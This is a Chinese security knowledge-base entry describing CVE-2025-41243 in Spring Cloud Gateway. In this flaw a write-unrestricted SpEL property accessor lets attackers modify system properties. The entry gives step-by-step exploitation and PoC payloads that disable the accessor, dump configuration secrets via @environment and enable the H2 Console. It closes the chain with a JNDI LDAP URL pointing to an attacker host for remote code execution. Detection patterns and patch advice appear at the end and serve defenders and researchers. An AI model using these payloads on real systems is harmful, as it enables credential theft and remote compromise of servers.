---
id: web-java-expression-spel-spring-cloud-gateway-property-write-env-h2-rce
title: Spring Cloud Gateway CVE-2025-41243 属性写读取 Environment 配置并置 H2 Console 打 JNDI
type: scenario
domain: web
path: web/java/expression/spel
technique: gateway-spel-write-only-restriction-bypass-env-h2-rce
tags:
- java
- spring
- spring-cloud-gateway
- spel
- expression-injection
- property-modification
- information-disclosure
- h2
- jndi
- rce
- cve-2025-41243
cve:
- CVE-2025-41243
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V14
  verified_at: '2026-11-05T01:48:21+08:00'
  notes: 已对照原文与29张图核对；RestrictivePropertyAccessor仅禁canRead、systemProperties改restrictive=false、environment.getPropertySources读配置、H2 console+JNDI弹计算器均一致；withAssignmentDisabled修复一致；原文仅3.1.9演示未给区间未设版本；未复现
url: /docs/web/java/expression/spel/web-java-expression-spel-spring-cloud-gateway-property-write-env-h2-rce/
draft: false
kb_aliases:
- CVE-2025-41243
- Spring Cloud Gateway 属性修改
- RestrictivePropertyAccessor canWrite 绕过
- '@systemProperties 修改系统属性'
- '@environment getPropertySources 读配置'
- H2 console JNDI
---

## 一句话结论

CVE-2022-22947 的修复把 SpEL 上下文换成只读受限的 `GatewayEvaluationContext`，但 `RestrictivePropertyAccessor` 只覆写了 `canRead` 而未覆写 `canWrite`，于是攻击者仍能借助 `@systemProperties` 修改系统属性（包括关闭限制性访问器），随后用 `@environment.getPropertySources` 读取配置与敏感信息，并通过开启 H2 Console 走 JNDI 达到命令执行（CVE-2025-41243）。

## 原理

- 路由热更新仍会把 filter 的 `args.value` 当 SpEL 求值，入口和 CVE-2022-22947 相同：`#{...}` 经 `ShortcutConfigurable#getValue` → `ShortcutType#normalize` → `ConfigurationService#normalizeProperties`。
- 2022 修复后 `GatewayEvaluationContext` 不再直接把表达式交给 `StandardEvaluationContext`，而是委托给 `SimpleEvaluationContext`，后者不支持 `T()` 类型引用、构造器和任意方法调用；同时使用 `RestrictivePropertyAccessor`。
- `RestrictivePropertyAccessor` 继承 `ReflectivePropertyAccessor`，只重写 `canRead()` 让其恒返回 `false`，没有重写 `canWrite()`；因此属性“读”被禁，但“写”仍然放行。这是权限模型只做了一半导致的绕过。
- SpEL 对 Map 的索引访问走 Map 访问器，不走被禁的反射属性读。`@systemProperties` 就是一个可写的 `Map`，对它的 `['key']=value` 赋值不受 `canRead` 限制；而 `@environment` 的 `getPropertySources` 等方法在关闭限制后可用于读取。
- 关闭限制的开关是系统属性：把 `spring.cloud.gateway.restrictive-property-accessor.enabled` 写成 `false` 后，`GatewayEvaluationContext` 在后续构建时走 `SimpleEvaluationContext.forReadOnlyDataBinding()`，属性读限制消失。需要触发 `/actuator/gateway/refresh` 让路由重载后生效。
- 一旦能任意写系统属性，就能打开应用里已有能力的危险开关。原文选择 H2：把 `spring.h2.console.enabled` 和 `spring.h2.console.settings.web-allow-others` 置为 `true`，再从外部访问 H2 Console，用 `javax.naming.InitialContext` 作为驱动、`ldap://` 作为 JDBC URL 触发 JNDI 查找，由恶意 LDAP 服务返回引用并加载远程类，最终命令执行。前提是应用 classpath 上有 H2 且 H2 Console 功能可用。

## 触发条件

- 目标使用受影响的 Spring Cloud Gateway（原文以 3.1.9 分析），且漏洞入口与 CVE-2022-22947 相同：Gateway actuator 路由管理端点可达、未认证，能把 `#{...}` 送入路由 filter 参数并触发 refresh。
- 目标未打 CVE-2025-41243 补丁（补丁在 `SimpleEvaluationContext` 构建时加入 `withAssignmentDisabled()`，禁用赋值表达式）。
- 读取配置需要 `environment` bean 可解析；走 H2 路线还需要应用引入 H2、H2 Console 相关类存在，且攻击者能运行 LDAP/JNDI 服务。
- 原文演示开启了 `management.endpoints.web.exposure.include=*` 与 beans 端点以便枚举 bean；实际利用主要依赖 `systemProperties`、`environment` 这两个 Spring 核心 bean 可被解析。

## 利用步骤

1. 按 CVE-2022-22947 的方式向路由 filter 参数注入 SpEL，创建路由并刷新，确认表达式可求值。
2. 用 `@systemProperties` 把 `spring.cloud.gateway.restrictive-property-accessor.enabled` 写为 `false`。
3. 调用 `/actuator/gateway/refresh` 重载路由，使限制性访问器关闭。
4. 再注入表达式，用 `@environment.getPropertySources` 过滤并展开配置源，读取 application.yml 等配置中的敏感项。
5. RCE 路线：继续写系统属性开启 H2 Console，并允许外部访问；访问 H2 Console，用 JNDI 驱动连接恶意 LDAP 服务触发远程类加载与命令执行。

## PoC

关闭限制性属性访问器：

```text
#{ @systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = false}
```

刷新使配置生效：

```http
POST /actuator/gateway/refresh HTTP/1.1
```

读取配置源（筛选可选 classpath 配置源并展开键值）：

```text
#{ @environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*' ][0].source.![{#this.getKey+'='+#this.getValue.toString}] }
```

开启 H2 Console 并允许外部访问：

```text
#{ @systemProperties['spring.h2.console.enabled'] = true}
#{ @systemProperties['spring.h2.console.settings.web-allow-others'] = true}
```

随后访问 H2 Console 的登录页，选择 Generic H2 (Embedded)，驱动类填 `javax.naming.InitialContext`，JDBC URL 填 `ldap://<attacker>:1389/Basic/Command/<base64-cmd>`，由恶意 LDAP 返回 JNDI 引用触发命令执行（原文用计算器验证）。

## 变体与关联

- 变体：不打开 H2，改为修改其他需要系统属性配合的利用开关，如 JMX RMI（原文提到 jmxrmi 也可 RCE），具体取决于目标 classpath 与已有 bean。
- 变体：单纯做信息收集时，关闭限制后可直接读 `environment` 中的数据库口令、云凭证、内部地址等。
- 关联：[[web-java-expression-spel-spring-cloud-gateway-22947-actuator-route-rce]]（同入口的 2022 版本，`StandardEvaluationContext` 直接 RCE）。
- 关联：[[web-java-expression-spel-spring-cloud-gateway-property-method-chain]]（同一属性写原语，改用方法名兜底调用链实现任意文件读取）。
- 关联：[[web-java-expression-spel-injection-to-rce]]（SpEL 基础原理）。
- 边界：`systemProperties`/`environment` bean 不存在、H2 未引入、JNDI 被 JDK 版本限制（高版本默认禁用远程 codebase 或需 trustURLCodebase）、或刷新不可达时，对应阶段不成立。

## 检测与防御

- 检测：路由定义/refresh 请求体含 `#{`、`@systemProperties`、`@environment`、`getPropertySources`、`restrictive-property-accessor`、`spring.h2.console`。
- 检测：运行期出现对 `spring.*` 系统属性的异常写入、H2 Console 被外部访问、JNDI/LDAP 外连。
- 修复：升级到修复 CVE-2025-41243 的版本；补丁通过 `withAssignmentDisabled()` 禁止 SpEL 赋值表达式。
- 加固：actuator 管理端点仅内网/认证可达或关闭 gateway 管理端点；移除不需要的 H2 Console 依赖；对 Web 进程做最小权限与出网限制。
